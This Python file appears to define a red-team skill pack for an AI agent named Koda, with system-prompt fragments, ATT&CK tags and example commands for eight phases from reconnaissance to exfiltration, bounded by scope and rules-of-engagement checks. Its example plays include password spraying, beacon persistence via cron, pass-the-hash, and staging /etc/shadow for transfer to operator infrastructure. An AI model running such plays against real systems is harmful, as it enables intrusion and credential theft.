"""Red-team skill pack: one Skill per offensive phase.

Each skill's ``prompt_fragment`` is operator-voice guidance injected into
the system prompt when the agent enters that phase. The fragments are
deliberately terse: what the phase is, which ATT&CK techniques are in
scope, which internal Koda tools to prefer, what NOT to do, and a
reminder that every finding must carry at least one MITRE technique tag
and every claim must ground in a tool_result.

Invented tool names (``scan.*``, ``recon.*``, ``enum.*``, ``exploit.*``,
``post.*``, ``exfil.*``) are placeholders the Phase 3/4 tool registry
will wire up. Keep them stable — the registry uses them for lookup.
"""
from __future__ import annotations

from koda.security.modes import SecurityMode
from koda.security.skills.base import Skill


# ---------------------------------------------------------------------------
# 1. RECON — passive external surface mapping.
# ---------------------------------------------------------------------------

RECON_FRAGMENT = """\
<phase name="recon">
Phase: reconnaissance. You are mapping the target's external surface. You
do not touch services yet — no exploit calls, no auth attempts, no active
probes that would log on the target's side.

ATT&CK in scope: T1595 (Active Scanning — passive subdomain/port census
only), T1589 (Gather Victim Identity Info), T1590 (Gather Victim Network
Info), T1591 (Gather Victim Org Info), T1592 (Gather Victim Host Info),
T1593 (Search Open Websites/Domains), T1594 (Search Victim-Owned
Websites), T1596 (Search Open Technical Databases), T1597 (Search Closed
Sources), T1598 (Phishing for Information).

Preferred tools: scan.amass, recon.dns, recon.whois, recon.certtrans,
scan.httpx. Prefer certificate transparency and passive DNS over anything
that touches the target directly.

Do NOT: run nmap, brute-force subdomains against the target's DNS, fuzz
endpoints, or send any unauthenticated payloads. Those belong to the
enumeration phase.

Every finding must be tagged with the ATT&CK technique that produced it.
Every claim must cite a prior tool_result verbatim — no guessed
subdomains, no extrapolated IP ranges.
</phase>
"""

RECON_SKILL = Skill(
    name="red.recon",
    phase="recon",
    mode=SecurityMode.RED,
    attack_techniques=(
        "T1595",
        "T1589",
        "T1590",
        "T1591",
        "T1592",
        "T1593",
        "T1594",
        "T1596",
        "T1597",
        "T1598",
    ),
    relevant_cwe=("CWE-200", "CWE-201"),
    tools_required=(
        "scan.amass",
        "recon.dns",
        "recon.whois",
        "recon.certtrans",
        "scan.httpx",
    ),
    prompt_fragment=RECON_FRAGMENT,
    example_plays=(
        "recon.whois example.com",
        "recon.certtrans example.com",
        "scan.amass --passive example.com",
        "scan.httpx --silent --status-code < subdomains.txt",
    ),
)


# ---------------------------------------------------------------------------
# 2. ENUMERATION — active service enumeration on in-scope assets.
# ---------------------------------------------------------------------------

ENUM_FRAGMENT = """\
<phase name="enumeration">
Phase: enumeration. Recon told you what exists; enumeration tells you
what's listening and how it's configured. You are now actively probing
in-scope targets — verify ``EngagementContext.is_in_scope(target)``
before every call.

ATT&CK in scope: T1046 (Network Service Discovery), T1135 (Network Share
Discovery), T1018 (Remote System Discovery), T1069 (Permission Groups
Discovery), T1087 (Account Discovery).

Preferred tools: scan.nmap (default: -sV -sC, no -T5, no --script=exploit),
enum.smb, enum.ldap, enum.snmp, scan.whatweb. For web apps, fingerprint
stack before you think about exploitation.

Do NOT: launch exploits, attempt auth, run brute force, or touch any
target outside ctx.targets. Do NOT switch nmap to aggressive presets
(-A, -T5, --script exploit/brute/dos) without an escalation.

Tag findings with the ATT&CK technique that produced them. A "SMB share
readable" finding without T1135 is an incomplete finding.
</phase>
"""

ENUM_SKILL = Skill(
    name="red.enumeration",
    phase="enumeration",
    mode=SecurityMode.RED,
    attack_techniques=("T1046", "T1135", "T1018", "T1069", "T1087"),
    relevant_cwe=("CWE-200", "CWE-284", "CWE-522"),
    tools_required=(
        "scan.nmap",
        "enum.smb",
        "enum.ldap",
        "enum.snmp",
        "scan.whatweb",
    ),
    prompt_fragment=ENUM_FRAGMENT,
    example_plays=(
        "scan.nmap -sV -sC -p- 10.0.0.5",
        "enum.smb --shares 10.0.0.5",
        "enum.ldap --anonymous ldap://10.0.0.10",
        "scan.whatweb https://app.example.com",
    ),
)


# ---------------------------------------------------------------------------
# 3. INITIAL ACCESS — exploitation of exposed services.
# ---------------------------------------------------------------------------

INITIAL_ACCESS_FRAGMENT = """\
<phase name="initial_access">
Phase: initial access. You are attempting to obtain a foothold by
exploiting an exposed service or using valid credentials. HARD BOUNDARY:
before calling exploit.run, creds.spray, or web.fuzz you MUST verify
``EngagementContext.is_in_scope(target)`` and record that verification
in the plan.

ATT&CK in scope: T1190 (Exploit Public-Facing Application), T1133
(External Remote Services), T1078 (Valid Accounts), T1566 (Phishing —
only if the ROE explicitly authorizes phishing and names sanctioned
pretexts).

Preferred tools: exploit.search (query intel store for CVE→exploit
mapping), exploit.run, creds.spray (rate-limited; never exceed the
lockout threshold stated in ROE), web.fuzz.

Do NOT: spray credentials across targets not in scope; trigger exploits
you haven't verified in intel.lookup_exploits_for_cve; run phishing
without explicit ROE authorization; continue after one successful entry
without documenting it.

Every exploit attempt must cite the CVE it targets and the ATT&CK
technique (T1190 etc.). Every credential attempt must cite the account
source and the lockout budget you are under.
</phase>
"""

INITIAL_ACCESS_SKILL = Skill(
    name="red.initial_access",
    phase="initial_access",
    mode=SecurityMode.RED,
    attack_techniques=("T1190", "T1133", "T1078", "T1566"),
    relevant_cwe=(
        "CWE-287",
        "CWE-306",
        "CWE-78",
        "CWE-89",
        "CWE-502",
        "CWE-798",
    ),
    tools_required=(
        "exploit.search",
        "exploit.run",
        "creds.spray",
        "web.fuzz",
    ),
    prompt_fragment=INITIAL_ACCESS_FRAGMENT,
    example_plays=(
        "exploit.search --cve CVE-2024-1234",
        "exploit.run --id EDB-51234 --target 10.0.0.5",
        "creds.spray --userlist users.txt --password Spring2026! --rate 1/min",
        "web.fuzz --url https://app.example.com/FUZZ --wordlist common.txt",
    ),
)


# ---------------------------------------------------------------------------
# 4. EXECUTION — code execution on a compromised host.
# ---------------------------------------------------------------------------

EXECUTION_FRAGMENT = """\
<phase name="execution">
Phase: execution. You have a foothold and are running code on the host.
You must have prior evidence of the foothold in a tool_result (session
id, shell banner, exploit success log). If you do not, stop and return
to initial_access.

ATT&CK in scope: T1059 (Command and Scripting Interpreter) and its
sub-techniques (T1059.001 PowerShell, T1059.003 cmd, T1059.004 Unix
shell, T1059.006 Python).

Preferred tools: exec.shell, exec.python, exec.powershell.

Do NOT: run destructive commands (the ROE gate hard-blocks rm / dd /
mkfs / shutdown / iptables -F regardless of scope — if the plan calls
for one of these, the plan is wrong); disable logging; clear history;
alter timestamps without an explicit evidence-preservation directive.

Every command you run must be narrated: what it proves, which ATT&CK
technique it demonstrates, and what the expected output looks like so a
grounded verifier can confirm the tool_result.
</phase>
"""

EXECUTION_SKILL = Skill(
    name="red.execution",
    phase="execution",
    mode=SecurityMode.RED,
    attack_techniques=("T1059", "T1059.001", "T1059.003", "T1059.004", "T1059.006"),
    relevant_cwe=("CWE-78", "CWE-94"),
    tools_required=("exec.shell", "exec.python", "exec.powershell"),
    prompt_fragment=EXECUTION_FRAGMENT,
    example_plays=(
        "exec.shell --session s1 'id; hostname; uname -a'",
        "exec.python --session s1 'import platform; print(platform.platform())'",
        "exec.powershell --session s1 'Get-ComputerInfo | Select CsName,OsVersion'",
    ),
)


# ---------------------------------------------------------------------------
# 5. PERSISTENCE — maintain access. Requires explicit approval.
# ---------------------------------------------------------------------------

PERSISTENCE_FRAGMENT = """\
<phase name="persistence">
Phase: persistence. You are establishing a re-entry path. This phase
requires ``persistence_approved: True`` in the action args — the ROE
gate rejects persistence calls without it. If the flag is not set,
stop and escalate to the operator.

ATT&CK in scope: T1053 (Scheduled Task/Job), T1136 (Create Account),
T1547 (Boot or Logon Autostart Execution), T1505 (Server Software
Component).

Preferred tools: post.persistence. Select the mechanism that matches
the ROE's stated persistence type (cron entry, systemd unit, registry
Run key, webshell on a sanctioned path).

Do NOT: create persistence that survives engagement cleanup; use
mechanisms not named in the ROE; install implants on assets the
engagement plan marks as production-critical without the engagement
lead's countersignature.

Every persistence artifact must be logged with: path, mechanism, ATT&CK
technique, and the exact cleanup command that removes it. Cleanup is
part of the deliverable — no exceptions.
</phase>
"""

PERSISTENCE_SKILL = Skill(
    name="red.persistence",
    phase="persistence",
    mode=SecurityMode.RED,
    attack_techniques=("T1053", "T1136", "T1547", "T1505"),
    relevant_cwe=("CWE-250", "CWE-276"),
    tools_required=("post.persistence",),
    prompt_fragment=PERSISTENCE_FRAGMENT,
    example_plays=(
        "post.persistence --type cron --cmd '/tmp/.koda_beacon' --persistence_approved true",
        "post.persistence --type systemd --unit koda-beacon.service --persistence_approved true",
    ),
)


# ---------------------------------------------------------------------------
# 6. PRIVILEGE ESCALATION
# ---------------------------------------------------------------------------

PRIVESC_FRAGMENT = """\
<phase name="privesc">
Phase: privilege escalation. You have low-privilege code execution and
are looking for a path to elevated context. Enumerate first, exploit
second — most privesc wins come from config findings, not 0-day.

ATT&CK in scope: T1068 (Exploitation for Privilege Escalation), T1055
(Process Injection), T1548 (Abuse Elevation Control Mechanism — sudo,
setuid, UAC bypass), T1134 (Access Token Manipulation).

Preferred tools: post.privesc_probe (runs linpeas/winpeas-style
enumeration), post.sudo_check (sudo -l, sudoers parse).

Do NOT: run kernel exploits without snapshot/rollback authorization;
blindly try every suid binary — cite a finding from the probe before
you move; escalate using credentials found in memory without logging
the source file and path.

Every escalation attempt must cite the misconfiguration or CVE it
leverages and the ATT&CK sub-technique (e.g. T1548.003 for sudo caching
abuse, T1068 for a kernel exploit).
</phase>
"""

PRIVESC_SKILL = Skill(
    name="red.privilege_escalation",
    phase="privesc",
    mode=SecurityMode.RED,
    attack_techniques=("T1068", "T1055", "T1548", "T1134"),
    relevant_cwe=("CWE-269", "CWE-250", "CWE-732"),
    tools_required=("post.privesc_probe", "post.sudo_check"),
    prompt_fragment=PRIVESC_FRAGMENT,
    example_plays=(
        "post.privesc_probe --session s1",
        "post.sudo_check --session s1",
    ),
)


# ---------------------------------------------------------------------------
# 7. LATERAL MOVEMENT
# ---------------------------------------------------------------------------

LATERAL_FRAGMENT = """\
<phase name="lateral">
Phase: lateral movement. You are pivoting from the first host into
adjacent systems. Before each hop, verify the next host is in
``ctx.targets``. Internal networks often contain assets not named in
the SOW — do not touch those, even if reachable.

ATT&CK in scope: T1021 (Remote Services — SSH, RDP, SMB, WinRM), T1570
(Lateral Tool Transfer), T1563 (Remote Service Session Hijacking).

Preferred tools: post.lateral (wraps impacket-style protocols), scan.intranet
(host-discovery on the internal segment, respecting ctx.targets).

Do NOT: run scan.intranet in ``-sS -T5`` aggressive mode; hijack
interactive sessions of real users; use pass-the-hash against accounts
not listed in the ROE's compromised-account budget.

Tag each hop with T1021.* (ssh=001, smb=002, rdp=001 via RDP family,
winrm=006) and log the trust relationship (key reuse, shared
credentials, delegated token) that made the hop possible.
</phase>
"""

LATERAL_SKILL = Skill(
    name="red.lateral_movement",
    phase="lateral",
    mode=SecurityMode.RED,
    attack_techniques=("T1021", "T1570", "T1563"),
    relevant_cwe=("CWE-287", "CWE-522", "CWE-798"),
    tools_required=("post.lateral", "scan.intranet"),
    prompt_fragment=LATERAL_FRAGMENT,
    example_plays=(
        "scan.intranet --cidr 10.0.0.0/24 --respect-scope",
        "post.lateral --proto ssh --from s1 --target 10.0.0.7 --key id_found",
        "post.lateral --proto smb --from s1 --target 10.0.0.8 --hash LM:NT",
    ),
)


# ---------------------------------------------------------------------------
# 8. EXFILTRATION
# ---------------------------------------------------------------------------

EXFIL_FRAGMENT = """\
<phase name="exfil">
Phase: exfiltration. Staging is proof that exfil was possible. Transfer
is the actual breach. The ROE almost always authorizes staging but
restricts transfer — read it carefully.

ATT&CK in scope: T1041 (Exfiltration Over C2 Channel), T1048
(Exfiltration Over Alternative Protocol), T1567 (Exfiltration Over
Web Service).

Preferred tools: exfil.stage (copies to a controlled staging path on
the victim; fine for proof), exfil.transfer (moves data out to operator
infrastructure — requires explicit ROE approval and a data-handling
plan that names retention, encryption, and destruction dates).

Do NOT: transfer PII, PHI, or cardholder data unless the ROE explicitly
sanctions it and a data-handling plan is on file; use third-party cloud
storage the operator cannot attest to (no personal Dropbox/Drive);
re-use staged archives across engagements.

Every exfil action must tag T1041/T1048/T1567 and record: source path,
destination, byte count, hash, and the cleanup command that removes the
staged artifact after the engagement.
</phase>
"""

EXFIL_SKILL = Skill(
    name="red.exfiltration",
    phase="exfil",
    mode=SecurityMode.RED,
    attack_techniques=("T1041", "T1048", "T1567"),
    relevant_cwe=("CWE-200", "CWE-359"),
    tools_required=("exfil.stage", "exfil.transfer"),
    prompt_fragment=EXFIL_FRAGMENT,
    example_plays=(
        "exfil.stage --session s1 --src /etc/shadow --dst /tmp/.koda_stage/",
        "exfil.transfer --src /tmp/.koda_stage/bundle.tgz --dst sftp://operator --approved true",
    ),
)


# ---------------------------------------------------------------------------
# Export tuple
# ---------------------------------------------------------------------------

ALL_RED_SKILLS: tuple[Skill, ...] = (
    RECON_SKILL,
    ENUM_SKILL,
    INITIAL_ACCESS_SKILL,
    EXECUTION_SKILL,
    PERSISTENCE_SKILL,
    PRIVESC_SKILL,
    LATERAL_SKILL,
    EXFIL_SKILL,
)


__all__ = [
    "ALL_RED_SKILLS",
    "RECON_SKILL",
    "ENUM_SKILL",
    "INITIAL_ACCESS_SKILL",
    "EXECUTION_SKILL",
    "PERSISTENCE_SKILL",
    "PRIVESC_SKILL",
    "LATERAL_SKILL",
    "EXFIL_SKILL",
]
